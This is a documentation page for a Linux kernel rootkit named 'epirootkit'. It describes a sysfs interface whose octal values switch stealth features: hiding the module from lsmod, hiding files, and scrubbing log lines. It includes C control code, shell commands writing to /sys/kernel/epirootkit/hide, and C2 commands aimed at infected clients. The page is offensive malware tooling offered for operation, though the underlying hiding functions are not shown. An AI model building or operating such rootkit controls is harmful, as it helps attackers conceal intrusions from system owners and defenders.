---
title: "Sysfs Interface"
description: "Linux sysfs interface with octal permission configuration for rootkit control"
icon: "settings"
date: "2025-05-30T00:00:00+01:00"
lastmod: "2025-05-30T00:00:00+01:00"
draft: false
toc: true
weight: 513
---

# Sysfs Interface

Linux sysfs interface for rootkit control using octal permission-style configuration (like Linux file permissions).

## Implementation

```c
/* Octal hide control (like file permissions)
 * 1: Module hidden    2: Files hidden    4: Lines hidden
 * Examples: 0=visible, 1=module, 3=module+files, 7=all hidden */

static void update_hide_state(int mode)
{
    /* Module hiding (bit 0) */
    if (mode & 1) {
        if (!is_module_hidden()) hide_module();
    } else {
        if (is_module_hidden()) unhide_module();
    }
    
    /* File hiding (bit 1) */
    if (mode & 2) {
        if (!is_file_hiding_enabled()) enable_file_hiding();
    } else {
        if (is_file_hiding_enabled()) disable_file_hiding();
    }
    
    /* Line hiding (bit 2) */
    if (mode & 4) {
        if (!is_line_hiding_enabled()) enable_line_hiding();
    } else {
        if (is_line_hiding_enabled()) disable_line_hiding();
    }
}
```

Uses 3-bit octal system (0-7) where each bit controls a stealth feature.

## Octal Values

| Value | Binary | Module | Files | Lines | Description |
|:-----:|:------:|:------:|:-----:|:-----:|:------------|
| `0`   | `000`  | ❌     | ❌    | ❌    | All features disabled - rootkit fully visible |
| `1`   | `001`  | ✅     | ❌    | ❌    | Hide rootkit module from `lsmod` |
| `2`   | `010`  | ❌     | ✅    | ❌    | Hide rootkit files from `ls` |
| `3`   | `011`  | ✅     | ✅    | ❌    | Hide both module and files |
| `4`   | `100`  | ❌     | ❌    | ✅    | Hide rootkit traces from log files |
| `5`   | `101`  | ✅     | ❌    | ✅    | Hide module and log traces |
| `6`   | `110`  | ❌     | ✅    | ✅    | Hide files and log traces |
| `7`   | `111`  | ✅     | ✅    | ✅    | Maximum stealth - all features enabled |

## Usage

```bash
# Read current state
cat /sys/kernel/epirootkit/hide
# Output: Current octal value (0-7)

# Enable maximum stealth (all features)
echo 7 > /sys/kernel/epirootkit/hide

# Hide only module and files
echo 3 > /sys/kernel/epirootkit/hide

# Disable all hiding
echo 0 > /sys/kernel/epirootkit/hide
# Or use quick unhide
echo 1 > /sys/kernel/epirootkit/unhide
```

## Control

### WebUI
Configuration controlled via **[Configuration Panel](../../04-web-ui/features/panels/configuration-panel.md)**

### C2 Commands
```bash
hide-module Client-1     # Sets bit 0 (echo 1 > hide)
hide-files Client-1      # Sets bit 1 (echo 2 > hide)  
hide-lines Client-1      # Sets bit 2 (echo 4 > hide)
status Client-1          # Shows current hide_mode
```

Provides Linux-native, permission-style configuration for all stealth features. 